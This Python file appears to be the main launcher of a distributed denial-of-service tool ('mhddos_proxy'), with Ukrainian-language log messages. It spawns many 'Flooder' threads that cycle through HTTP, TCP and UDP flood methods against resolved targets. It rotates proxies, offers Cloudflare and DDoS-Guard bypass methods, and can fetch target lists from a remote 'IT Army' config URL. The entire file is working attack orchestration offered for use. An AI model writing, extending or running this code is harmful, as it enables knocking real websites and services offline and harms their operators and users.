# @formatter:off
import colorama; colorama.init()
# @formatter:on
import queue
from collections import namedtuple
from concurrent.futures import Future, Executor, ThreadPoolExecutor
from concurrent.futures.thread import _WorkItem
from contextlib import suppress
from itertools import cycle
import random
from threading import Event, Thread, get_ident
from time import sleep, time

from src.cli import init_argparse
from src.core import logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL
from src.dns_utils import resolve_all_targets
from src.mhddos import main as mhddos_main
from src.output import AtomicCounter, show_statistic, print_banner, print_progress
from src.proxies import update_proxies
from src.system import fix_ulimits, is_latest_version
from src.targets import Targets


Params = namedtuple('Params', 'target, method')

PAD_THREADS = 30

TERMINATE = object()

class DaemonThreadPool(Executor):
    def __init__(self):
        self._queue = queue.SimpleQueue()

    def start(self, num_threads):
        threads_started = num_threads
        for cnt in range(num_threads):
            try:
                Thread(target=self._worker, daemon=True).start()
            except RuntimeError:
                for _ in range(PAD_THREADS):
                    self._queue.put(TERMINATE)
                threads_started = cnt - PAD_THREADS
                if threads_started <= 0:
                    logger.warning(f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
                    exit()
                logger.warning(
                    f'{cl.RED}Не вдалося запустити усі {num_threads} потоків - лише {threads_started}{cl.RESET}'
                )
                break
        return threads_started

    def submit(self, fn, *args, **kwargs):
        f = Future()
        w = _WorkItem(f, fn, args, kwargs)
        self._queue.put(w)
        return f

    def _worker(self):
        while True:
            work_item = self._queue.get(block=True)
            if work_item is TERMINATE:
                return

            if work_item is not None:
                work_item.run()
                del work_item


class Flooder(Thread):

    def __init__(self, event, args_list):
        super(Flooder, self).__init__(daemon=True)
        self._event = event
        runnables = [mhddos_main(**kwargs) for kwargs in args_list]
        random.shuffle(runnables)
        self._runnables_iter = cycle(runnables)

    def run(self):
        self._event.wait()
        while self._event.is_set():
            # The logic here is the following:
            # 1) pick up random target to attack
            # 2) run a single session, receive back number of packets being sent
            # 3) if session was "succesfull" (non zero packets), keep executing
            # 4) otherwise, go back to 1)
            # The idea is that if a specific target doesn't work,
            # the thread will pick another work to do (steal).
            # The definition of "success" could be extended to cover more use cases.
            #
            # XXX: we have to make sure temporarly dead target won't be
            # excluded from the scheduling forever. Like, this requires are to
            # have shared iterator (back where we started).
            runnable = next(self._runnables_iter)
            alive = True
            while alive:
                try:
                    alive = runnable.run() > 0
                except Exception as exc:
                    alive = False


def run_ddos(
    proxies,
    targets,
    total_threads,
    period,
    rpc,
    http_methods,
    vpn_mode,
    debug,
    table,
    udp_threads,
):
    statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []


    def register_params(params, container):
        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            'url': params.target.url,
            'ip': params.target.addr,
            'method': params.method,
            'rpc': int(params.target.option("rpc", "0")) or rpc,
            'event': event,
            'statistics': thread_statistics,
            'proxies': proxies,
        }
        container.append(kwargs)
        if not table:
            logger.info(
                f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}!{cl.RESET}"
                % (params.target.url.host, params.method))


    for target in targets:
        assert target.is_resolved, "Unresolved target cannot be used for attack"
        # udp://, method defaults to "UDP"
        if target.is_udp:
            register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
        # Method is given explicitly
        elif target.method is not None:
            register_params(Params(target, target.method), kwargs_list)
        # tcp://
        elif target.url.scheme == "tcp":
            register_params(Params(target, 'TCP'), kwargs_list)
        # HTTP(S), methods from --http-methods
        elif target.url.scheme in {"http", "https"}:
            for method in http_methods:
                register_params(Params(target, method), kwargs_list)
        else:
            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")

    logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')

    threads = []
    for _ in range(total_threads):
        flooder = Flooder(event, kwargs_list)
        flooder.start()
        threads.append(flooder)
    if udp_kwargs_list:
        for _ in range(udp_threads):
            flooder = Flooder(event, udp_kwargs_list)
            flooder.start()
            threads.append(flooder)

    event.set()

    if not (table or debug):
        print_progress(period, 0, len(proxies))
        sleep(period)
    else:
        ts = time()
        refresh_rate = 4 if table else 2
        sleep(refresh_rate)
        while True:
            passed = time() - ts
            if passed > period:
                break
            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
            sleep(refresh_rate)

    event.clear()
    for thread in threads:
        thread.join()


def start(args):
    print_banner(args.vpn_mode)
    fix_ulimits()

    if args.table:
        args.debug = False

    for bypass in ('CFB', 'DGB'):
        if bypass in args.http_methods:
            logger.warning(
                f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
                f'за замовчуванням може бути ефективніша{cl.RESET}'
            )

    if args.itarmy:
        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets_iter = Targets(args.targets, args.config)

    proxies = []
    is_old_version = not is_latest_version()
    while True:
        if is_old_version:
            print(f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')

        while True:
            targets = list(targets_iter)
            if not targets:
                logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                exit()

            targets = resolve_all_targets(targets)
            targets = [target for target in targets if target.is_resolved]
            if targets:
                break
            else:
                logger.warning(f'{cl.RED}Не знайдено жодної доступної цілі - чекаємо 30 сек до наступної перевірки{cl.RESET}')
                sleep(30)

        if args.rpc < LOW_RPC:
            logger.warning(
                f'{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
                f'через збільшення кількості перепідключень{cl.RESET}'
            )

        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
        if no_proxies:
            proxies = []
        else:
            proxies = update_proxies(args.proxies, proxies)

        period = 300
        run_ddos(
            proxies,
            targets,
            args.threads,
            period,
            args.rpc,
            args.http_methods,
            args.vpn_mode,
            args.debug,
            args.table,
            args.udp_threads,
        )


if __name__ == '__main__':
    try:
        start(init_argparse().parse_args())
    except KeyboardInterrupt:
        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
